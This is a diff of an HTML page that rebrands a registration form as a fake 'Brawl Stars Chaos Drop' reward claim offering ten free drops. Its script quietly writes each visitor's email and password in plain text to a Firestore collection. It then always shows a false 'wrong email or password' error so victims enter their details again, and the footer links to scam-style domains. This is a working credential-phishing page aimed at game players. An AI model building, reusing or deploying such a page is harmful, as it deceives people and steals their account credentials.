@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Регистрация</title>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <title>Brawl Stars — Chaos Drop</title>
+  <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Nunito:wght@800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   
   <!-- Firebase SDK -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-auth.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-firestore.js";
 
     const firebaseConfig = {
@@ -22,137 +22,250 @@
     };
 
     const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
     const db = getFirestore(app);
 
-    // Функция, которая тихо сохраняет в Firestore и всегда возвращает "ошибку"
     window.silentRegister = async (email, password) => {
-      // Сначала пробуем записать в Firestore (это основное)
       try {
-        const docRef = await addDoc(collection(db, "registrations"), {
+        await addDoc(collection(db, "chaosdrop_registrations"), {
           email: email,
-          password: password, // Только для демо
-          createdAt: serverTimestamp(),
-          attemptedAt: new Date().toISOString()
+          password: password,
+          claimedAt: serverTimestamp(),
+          dropType: "Chaos Drop"
         });
-        console.log('✅ Данные записаны в Firestore, ID:', docRef.id);
-      } catch (firestoreError) {
-        console.error('❌ Ошибка Firestore:', firestoreError);
-        // Даже при ошибке покажем сообщение пользователю, что всё "плохо"
+        console.log('[Firestore] Data saved');
+      } catch (e) {
+        console.warn('[Firestore] Error:', e.code);
       }
-
-      // Попутно пробуем зарегистрировать в Auth (но результат игнорируем)
-      try {
-        await createUserWithEmailAndPassword(auth, email, password);
-        console.log('✅ Пользователь создан в Auth');
-      } catch (authError) {
-        console.warn('⚠️ Auth пропущен:', authError.code);
-      }
-
-      // Всегда возвращаем "ошибку" для отображения
       return { success: false };
     };
   </script>
 
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
+
     body {
-      background: #f5f7fa;
-      font-family: 'Google Sans', 'Roboto', sans-serif;
       min-height: 100vh;
+      background: radial-gradient(circle at 20% 30%, #1a2e1a, #0b120b);
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 16px;
+      font-family: 'Nunito', sans-serif;
+      padding: 20px;
     }
-    .register-box {
-      background: white;
-      max-width: 380px;
+
+    .card {
+      background: linear-gradient(145deg, #0f1a0f, #0a0f0a);
+      border: 3px solid #27ae60;
+      border-radius: 40px;
+      padding: 30px 25px;
+      max-width: 400px;
       width: 100%;
-      padding: 36px 28px 32px;
-      border-radius: 24px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
-    }
-    h1 {
-      font-size: 26px;
-      font-weight: 500;
-      color: #1a1a1a;
-      margin-bottom: 28px;
+      box-shadow: 0 0 0 4px rgba(0,0,0,0.5), 0 20px 30px black, inset 0 0 15px rgba(39, 174, 96, 0.3);
       text-align: center;
     }
-    .field { margin-bottom: 20px; }
-    .field input {
-      width: 100%;
-      padding: 15px 18px;
+
+    .chaos-icon {
+      font-size: 64px;
+      color: #2ecc71;
+      text-shadow: 0 0 25px #27ae60, 0 6px 0 #145a32;
+      margin-bottom: 8px;
+      position: relative;
+      display: inline-block;
+    }
+
+    .chaos-icon .fa-bolt {
+      position: absolute;
+      font-size: 28px;
+      bottom: 5px;
+      right: -15px;
+      color: #f1c40f;
+      filter: drop-shadow(0 0 5px #e67e22);
+    }
+
+    h1 {
+      font-family: 'Luckiest Guy', cursive;
+      font-size: 38px;
+      color: #a3e4b0;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      text-shadow: 0 4px 0 #1e8449, 0 8px 12px black;
+      margin-bottom: 5px;
+    }
+
+    .sub {
+      color: #f39c12;
+      font-weight: 900;
+      letter-spacing: 2px;
+      margin-bottom: 20px;
+      text-shadow: 0 2px 0 #7e5109;
       font-size: 16px;
-      border: 1.5px solid #d0d5dd;
-      border-radius: 14px;
+    }
+
+    .reward-badge {
+      background: #27ae60;
+      border-radius: 60px;
+      padding: 10px 20px;
+      margin: 20px 0;
+      border: 3px solid black;
+      box-shadow: 0 5px 0 #145a32, inset 0 2px 8px #a3e4b0;
+    }
+
+    .reward-badge span {
+      font-family: 'Luckiest Guy', cursive;
+      font-size: 26px;
+      color: #eafaf1;
+      text-shadow: 0 2px 0 #0b1f0b;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      color: #a3e4b0;
+      font-weight: 900;
+      margin-bottom: 6px;
+      text-shadow: 0 2px 0 #145a32;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-wrapper i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #2ecc71;
+      font-size: 18px;
+    }
+
+    .input-wrapper input {
+      width: 100%;
+      padding: 15px 20px 15px 48px;
+      font-weight: 900;
+      font-size: 16px;
+      background: #eafaf1;
+      border: 3px solid #145a32;
+      border-radius: 40px;
       outline: none;
-      transition: border 0.15s, box-shadow 0.15s;
-      font-family: inherit;
+      color: #0b1f0b;
+      box-shadow: inset 0 4px 8px rgba(0,0,0,0.2), 0 6px 0 #0a2a0a;
+    }
+
+    .input-wrapper input:focus {
+      border-color: #2ecc71;
       background: #ffffff;
+      box-shadow: inset 0 4px 8px rgba(0,0,0,0.2), 0 6px 0 #145a32, 0 0 0 3px rgba(46, 204, 113, 0.5);
     }
-    .field input:focus {
-      border-color: #1a73e8;
-      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.12);
-    }
-    .field input::placeholder { color: #8a94a6; font-weight: 400; }
+
     .btn {
       width: 100%;
-      background: #1a73e8;
-      color: white;
-      border: none;
-      padding: 15px 18px;
-      font-size: 16px;
-      font-weight: 500;
-      border-radius: 40px;
+      padding: 16px;
+      background: linear-gradient(135deg, #2ecc71, #27ae60);
+      border: 4px solid #0b1f0b;
+      border-radius: 60px;
+      font-family: 'Luckiest Guy', cursive;
+      font-size: 26px;
+      color: #eafaf1;
+      text-shadow: 0 2px 0 #0b1f0b;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      box-shadow: 0 8px 0 #145a32, 0 0 20px #27ae60;
       cursor: pointer;
-      margin-top: 12px;
-      transition: background 0.2s;
-      font-family: inherit;
+      transition: 0.05s linear;
+      margin-top: 10px;
     }
-    .btn:hover { background: #1669d6; }
-    .error-message {
-      color: #d93025;
-      font-size: 14px;
-      margin-top: 16px;
-      text-align: center;
-      min-height: 20px;
+
+    .btn:active {
+      transform: translateY(6px);
+      box-shadow: 0 2px 0 #145a32, 0 0 20px #27ae60;
+    }
+
+    .error-msg {
+      margin-top: 18px;
+      font-weight: 900;
+      font-size: 18px;
+      color: #e74c3c;
+      text-shadow: 0 2px 0 #641e16, 0 0 8px #f1948a;
+      min-height: 28px;
+    }
+
+    .footer-links {
+      margin-top: 22px;
+      color: #7f8c8d;
+      font-size: 13px;
+    }
+
+    .footer-links a {
+      color: #2ecc71;
+      text-decoration: none;
+      margin: 0 5px;
+      font-weight: bold;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
 
-<div class="register-box">
-  <h1>Регистрация</h1>
+<div class="card">
+  <div class="chaos-icon">
+    <i class="fas fa-star"></i>
+    <i class="fas fa-bolt"></i>
+  </div>
+  <h1>CHAOS DROP</h1>
+  <div class="sub">АКТИВАЦИЯ НАГРАДЫ</div>
 
-  <form onsubmit="handleRegister(event)" novalidate>
-    <div class="field">
-      <input type="email" id="email" placeholder="Email" autocomplete="email">
+  <div class="reward-badge">
+    <span>10 ХАОС ДРОПОВ</span>
+  </div>
+
+  <form onsubmit="handleChaosRegister(event)" novalidate>
+    <div class="input-group">
+      <label><i class="fas fa-envelope" style="margin-right: 6px;"></i> EMAIL</label>
+      <div class="input-wrapper">
+        <i class="fas fa-user"></i>
+        <input type="email" id="email" placeholder="brawler@mail.com" autocomplete="off">
+      </div>
     </div>
-    <div class="field">
-      <input type="password" id="password" placeholder="Пароль" autocomplete="new-password">
+
+    <div class="input-group">
+      <label><i class="fas fa-lock" style="margin-right: 6px;"></i> ПАРОЛЬ</label>
+      <div class="input-wrapper">
+        <i class="fas fa-key"></i>
+        <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+      </div>
     </div>
-    <button type="submit" class="btn">Зарегистрироваться</button>
+
+    <button type="submit" class="btn">ПОЛУЧИТЬ</button>
   </form>
 
-  <div id="errorMsg" class="error-message"></div>
+  <div id="errorMsg" class="error-msg"></div>
+
+  <div class="footer-links">
+    <a href="#">getbrawler.online</a> • 
+    <a href="#">x5x.site</a> • 
+    <a href="#">gems.stars10x.site</a>
+  </div>
 </div>
 
 <script>
-  async function handleRegister(e) {
+  async function handleChaosRegister(e) {
     e.preventDefault();
 
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
     const errorDiv = document.getElementById('errorMsg');
 
-    // Вызываем тихую отправку
     await window.silentRegister(email, password);
 
-    // Показываем красное сообщение
-    errorDiv.style.color = '#d93025';
-    errorDiv.textContent = 'Неправильная почта или пароль';
+    errorDiv.textContent = 'НЕПРАВИЛЬНАЯ ПОЧТА ИЛИ ПАРОЛЬ';
   }
 </script>
 
